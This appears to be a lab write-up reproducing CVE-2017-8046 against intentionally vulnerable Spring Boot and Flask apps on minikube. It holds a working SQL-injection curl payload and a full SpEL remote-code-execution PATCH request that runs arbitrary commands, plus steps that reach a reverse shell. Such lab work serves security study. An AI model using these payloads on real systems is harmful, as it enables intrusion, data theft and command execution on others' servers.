## CVE-2017-8046
https://nvd.nist.gov/vuln/detail/CVE-2017-8046 \
Target Application: Spring \
Software Link: https://github.com/m3ssap0/SpringBreakVulnerableApp \
Version: Spring Boot 1.5.6.RELEASE \
Writeup: https://github.com/Moon3r/vulfocus/blob/master/writeup/CVE-2017-8046/CVE-2017-8046.md \
Used PoCs: 
* https://github.com/m3ssap0/spring-break_cve-2017-8046

### Tactics Used
Initial Access: Application vulnerability \
Execution: Application exploit (RCE)

### Steps to Reproduce

## Setup
1- `minikube start` \
2- In FlaskVulnerableFrontEnd/kube run `kubectl apply -f vulnerable-frontend-deployment.yaml` \
3- In SpringBreakVulnerableApp/kube run `kubectl apply -f springbreak-vulnerable-app-deployment.yaml` \
4- Port-forward both of them with `kubectl port-forward pods/springbreak-vulnerable-app..... 8090:8090` and `kubectl port-forward pods/vulnerable-frontend-.... 5000:5000` \

## Attack
1- First the attacker uses SQL Injection to the frontend with known ip and port with `curl "http://localhost:5000/search?query='%20UNION%20SELECT%20id,%20secret_info%20AS%20info%20FROM%20secrets%20--"` and finds the internet endpoint of the backend server. \
2- Create the attack entity with `curl -i -X POST -H "Content-Type: application/json" -d '{ "name" : "Test", "attribute" : "foo"}' http://localhost:8090/entity` \
3- Then with this knowledge attacker runs the exploit.py, `python exploit.py --ip <ip from injection> --port <port from injection>` \
4- Attacker has connected a pseudo reverse shell. \

### Demo
[scenario-4.webm](https://github.com/HasanYldz/kubernetes-attack-scenarios/assets/56763025/e9540424-23bd-41c1-8fcc-75b97f8084df)


## Other ways to create the exploit and its payload
1- To Create server jar in SpringBreakVulnerableApp run `mvn clean install spring-boot:repackage` \
2- Run server `mvn spring-boot:run` \
3- To start server in SpringBreakVulnerableApp run `java -jar -Dserver.port=8090 target/SpringBreakVulnerableApp-1.0.jar --debug` \
4- Create data for exploit `curl -i -X POST -H "Content-Type: application/json" -d '{ "name" : "Test", "attribute" : "foo"}' http://localhost:8090/entity` \
5- To Create exploit jar, in spring-break_cve-2017-8046 run `mvn clean compile package` \
6- To execute commands use ` java -jar spring-break_cve-2017-8046-1.3-jar-with-dependencies.jar --url "http://localhost:8090/entity/1" --command "<command>"` or `curl --request PATCH -H "Content-Type: application/json-patch+json" -d '[{ "op" : "replace", "path" : "T(org.springframework.util.StreamUtils).copy(T(java.lang.Runtime).getRuntime().exec(\"<command>\").getInputStream(), T(org.springframework.web.context.request.RequestContextHolder).currentRequestAttributes().getResponse().getOutputStream()).x", "value" : "pwned" }]' "http://localhost:8090/entity/1/"` \
